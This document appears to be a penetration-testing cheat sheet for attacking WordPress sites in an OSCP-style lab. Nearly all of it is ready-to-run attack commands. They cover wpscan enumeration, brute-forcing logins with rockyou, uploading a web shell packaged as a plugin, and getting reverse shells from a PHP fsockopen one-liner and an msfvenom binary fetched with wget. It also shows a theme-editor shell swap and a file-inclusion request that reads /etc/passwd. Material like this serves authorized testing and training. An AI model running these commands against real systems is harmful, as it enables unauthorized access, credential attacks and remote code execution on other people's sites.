### Enumeration

```bash
# Basic enumeration
sudo wpscan --url $url -e

# Full enumeration (all plugins, themes, config backups, db exports)
sudo wpscan --url $url -e ap,at,cb,dbe

# User enumeration only
sudo wpscan --url $url -e u

# Skip TLS checks (for HTTPS targets)
sudo wpscan --url $url --disable-tls-checks -e

# Enumerate vulnerable plugins, themes, Timthumbs, config backups, db exports
sudo wpscan --url $url -e vp,vt,tt,cb,dbe

# PWK / OSCP style (output to file, no color)
sudo wpscan --url http://10.10.10.10 --enumerate ap,at,cb,dbe -o initial-wpscan -f cli-no-color
```
### Brute Force

```bash
# Basic brute force with user and password lists
sudo wpscan --url $url -U username.txt -P password.txt

# Supply explicit user and password wordlists
wpscan --url https://target.example.com -U users.txt -P passwords.txt

# Use rockyou against a user list
sudo wpscan --url http://10.10.10.10 -U user.txt -P /usr/share/wordlists/rockyou.txt

# Single dummy password to probe/enumerate usernames (noisy, unreliable)
echo 'Nope123!' > /tmp/onepass.txt
wpscan --url https://target.example.com -U users.txt -P /tmp/onepass.txt --threads 1
```
### Plugin Detection

```bash
# Popular plugins
sudo wpscan --url $url -e p --plugins-detection aggressive

# Vulnerable plugins only
sudo wpscan --url $url -e vp --plugins-detection aggressive

# All plugins
sudo wpscan --url $url -e ap --plugins-detection aggressive
```
## Shell Access

### Web Shell via Plugin Upload

```bash
# 1. Copy the plugin shell from SecLists
sudo cp /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php .

# 2. Zip it for WordPress upload
sudo zip plugin-shell.zip plugin-shell.php

# 3. Upload via WP Admin: Plugins → Add New → Upload Plugin
#    Upload plugin-shell.zip → Install → Activate

# Shell path after activation:
# /wp-content/plugins/plugin-shell/plugin-shell.php

# 4. Test command execution
sudo curl "http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami"
```

### Reverse Shell Methods

#### Method 1 – PHP Reverse Shell (URL-encoded)

```bash
# Raw PHP reverse shell payload
php -r '$sock=fsockopen("192.168.118.3",443);exec("/bin/sh -i <&3 >&3 2>&3");'

# URL-encode the payload, then execute via the plugin shell:
sudo curl "http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=<URL_ENCODED_PAYLOAD>"
```

#### Method 2 – ELF Binary via msfvenom

```bash
# 1. Generate reverse shell binary
sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.12.10 LPORT=443 -f elf > shell.elf

# 2. Serve it with a Python HTTP server
sudo python -m SimpleHTTPServer 80

# 3. Download to target via plugin shell
sudo curl "http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://10.11.12.10/shell.elf"

# 4. Make it executable
sudo curl "http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf"

# 5. Start listener
sudo nc -nvlp 443

# 6. Execute
sudo curl "http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./shell.elf"
```

#### Method 3 – Theme Editor PHP Shell (requires admin creds)

```
1. Log in as admin
2. Navigate to: Appearance → Theme Editor → 404 Template (right sidebar)
3. Replace the 404.php content with a web shell:
   https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
4. Access the shell at:
   http://<IP>/wp-content/themes/twentytwelve/404.php
```
## Plugin Exploits

### site-editor Plugin – Local File Inclusion

- **Reference:** https://www.exploit-db.com/exploits/44340

```bash
# Read /etc/passwd via LFI
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

### simple-file-list Plugin

- **Reference:** https://www.exploit-db.com/exploits/48979